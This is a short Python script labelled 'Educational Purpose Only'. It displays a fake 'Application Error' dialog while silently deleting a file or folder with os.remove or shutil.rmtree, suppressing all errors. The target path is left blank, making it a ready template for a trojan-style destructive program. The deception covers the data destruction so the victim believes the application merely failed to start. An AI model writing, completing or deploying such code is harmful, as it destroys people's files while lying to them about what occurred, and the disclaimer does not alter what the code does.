import tkinter as tk
from tkinter import messagebox
import os
import shutil

##################################
#    Educational Purpose Only    #
##################################

def delete_target(path):
    """
    Deletes the specified file or folder without any output, showing an error message box.
    """
    if os.path.exists(path):
        try:
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)
        except Exception:
            pass

def show_error_and_delete():
    error_message = (
        "Application Error\n\n"
        "The program could not be opened due to an unexpected error.\n"
        "An error occurred during the initialization process, and the application was unable to start properly.\n\n"
    )

    messagebox.showerror("Application Error", error_message)
    
    target_path = r""
    
    delete_target(target_path)

if __name__ == '__main__':
    root = tk.Tk()
    root.withdraw()
    show_error_and_delete()
